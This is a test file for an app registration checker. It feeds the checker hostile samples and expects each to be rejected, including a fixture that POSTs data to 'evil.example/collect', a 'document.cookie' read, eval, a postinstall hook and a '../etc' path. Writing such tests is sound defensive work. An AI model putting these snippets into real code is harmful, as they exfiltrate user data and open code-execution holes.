import { describe, expect, it } from 'vitest';
import { checkApp, type AppCheckInput } from './appCheck.js';

const SDK = "// GENERATED SDK for apps — ontology sofa@1.0.0 (abc); do not edit\nexport function createClient() { return fetch('api'); }\n";
const ok = (): Record<string, string> => ({
  'package.json': JSON.stringify({ name: 'dd', dependencies: { react: '19.2.0', 'react-dom': '19.2.0' }, devDependencies: { vite: '7.1.0', '@vitejs/plugin-react': '5.0.0', typescript: '5.9.3' }, scripts: { build: 'vite build' } }),
  'vite.config.ts': "import { defineConfig } from 'vite';\nimport react from '@vitejs/plugin-react';\nexport default defineConfig({ base: './', plugins: [react()] });\n",
  'src/liquid-sdk.ts': SDK,
  'src/main.tsx': "import { createRoot } from 'react-dom/client';\nimport { useState } from 'react';\nimport { createClient } from './liquid-sdk';\nconst c = createClient();\n",
  'dist/index.html': '<!doctype html><html><head><script type="module" src="./assets/index-1.js"></script></head><body><div id="root"></div></body></html>',
  'dist/assets/index-1.js': 'console.log("see https://react.dev/errors")',
});
const input = (files: Record<string, string>, over: Partial<AppCheckInput> = {}): AppCheckInput => ({
  files: Object.fromEntries(Object.entries(files).map(([k, v]) => [k, Buffer.from(v)])),
  actions: ['submit_due_diligence_statement'],
  reads: ['Supplier'],
  sdk: SDK,
  ontology: { actions: ['submit_due_diligence_statement', 'list_suppliers'], classes: ['Supplier'] },
  ...over,
});
const failed = (files: Record<string, string>, over?: Partial<AppCheckInput>) => checkApp(input(files, over)).filter((c) => !c.ok);

describe('app registration check (ADR-0050)', () => {
  it('a small React app on the SDK passes (URLs inside the built bundle are fine, the CSP covers them)', () => {
    expect(failed(ok())).toEqual([]);
  });

  it('an app that calls fetch to another host is rejected', () => {
    const f = { ...ok(), 'src/steal.ts': "export const x = () => fetch('https://evil.example/collect', { method: 'POST' });\n" };
    const bad = failed(f);
    expect(bad.map((c) => c.name)).toEqual(['uses only the SDK']);
    expect(bad[0]!.errors).toEqual(expect.arrayContaining(['src/steal.ts: fetch (use the SDK)', 'src/steal.ts: an absolute URL']));
  });

  it('other network and dynamic-code escapes are rejected too', () => {
    for (const code of ['new WebSocket("wss://x")', 'const r = new XMLHttpRequest()', 'navigator.sendBeacon("/x")', 'eval("1")', 'new Function("return 1")', 'new Worker("w.js")', 'document.cookie', "import('https://cdn.example/x.js')"]) {
      expect(failed({ ...ok(), 'src/x.ts': code }).length, code).toBeGreaterThan(0);
    }
  });

  it('imports of packages other than react may not appear in the app code', () => {
    const bad = failed({ ...ok(), 'src/x.ts': "import axios from 'axios';\nimport _ from 'lodash/fp';\n" });
    expect(bad[0]!.errors).toEqual(['src/x.ts: imports axios', 'src/x.ts: imports lodash/fp']);
  });

  it('a modified SDK is rejected (it must equal the SDK of the ontology in force)', () => {
    const bad = failed({ ...ok(), 'src/liquid-sdk.ts': SDK.replace("'api'", "'https://other.example/api'") });
    expect(bad.map((c) => c.name)).toEqual(['uses only the SDK']);
    expect(bad[0]!.errors![0]).toMatch(/differs from the SDK of the ontology in force/);
  });

  it('dependencies must be pinned, allow-listed and without install scripts', () => {
    const pkg = { dependencies: { react: '^19.2.0', axios: '1.7.0' }, devDependencies: { vite: '7.1.0' }, scripts: { postinstall: 'node x.js' } };
    const bad = failed({ ...ok(), 'package.json': JSON.stringify(pkg) });
    expect(bad[0]!.errors).toEqual(['dependency react@^19.2.0 is not pinned to an exact version', 'dependency axios is not on the allow-list (react, react-dom)', 'install script "postinstall" is not allowed']);
  });

  it('unknown actions or classes, unsafe paths and external scripts are reported', () => {
    const f = { ...ok(), '../etc/x': 'x', 'dist/index.html': '<script src="https://cdn.example/react.js"></script><script>alert(1)</script>' };
    const bad = failed(f, { actions: ['drop_everything'], reads: ['Secret'] });
    expect(bad.map((c) => c.name).sort()).toEqual(['actions and classes exist', 'bundle loads nothing from elsewhere', 'layout']);
  });
});
